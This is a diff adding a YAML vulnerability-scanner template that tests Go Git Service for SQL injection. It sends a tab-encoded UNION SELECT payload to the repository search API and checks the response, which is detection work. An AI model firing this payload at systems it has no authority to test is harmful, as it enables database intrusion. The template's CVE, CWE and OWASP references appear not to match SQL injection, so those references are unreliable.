@@ -1,0 +1,58 @@
+id: GO_GIT_SERVICE_SQLI
+info:
+  name: "Go Git Service SQL Injection Test"
+  description: "The Go Git Service SQL Injection Test checks for the presence of SQL injection vulnerabilities in a Git service application built with the Go programming language. This type of vulnerability occurs when user inputs, such as query parameters or form fields, are improperly sanitized before being used in SQL queries. If exploited, an attacker can manipulate the SQL queries to execute arbitrary commands, potentially gaining unauthorized access to the database, altering data, or compromising the application. Proper input validation and parameterized queries are essential to prevent SQL injection attacks."
+  details: "The Go Git Service SQL Injection Test checks for the presence of SQL injection vulnerabilities in a Git service application built with the Go programming language. This type of vulnerability occurs when user inputs, such as query parameters or form fields, are improperly sanitized before being used in SQL queries. If exploited, an attacker can manipulate the SQL queries to execute arbitrary commands, potentially gaining unauthorized access to the database, altering data, or compromising the application. Proper input validation and parameterized queries are essential to prevent SQL injection attacks."
+  impact: "The impact of a Go Git Service SQL Injection vulnerability can be severe, as it allows attackers to manipulate SQL queries and potentially gain unauthorized access to the database. This can lead to the exposure, modification, or deletion of sensitive data, as well as the execution of arbitrary commands. In some cases, attackers may escalate privileges or fully compromise the system. Securing the application with input validation, parameterized queries, and strong access controls is essential to mitigate these risks."
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: GO_GIT_SERVICE_SQLI
+  severity: CRITICAL
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
+  cwe:
+    - CWE-200
+    - CWE-16
+  cve:
+    - CVE-2020-9402
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_url: "/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27"
+        - modify_method: GET
+        - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    contains_all:
+      - '"ok":true'
+      - '"data"'
+      - '"repolink":"'
+    not_contains:
+      - <html>
+      - </html>
+    length:
+      gt: 0
+
+strategy:
+  run_once: /
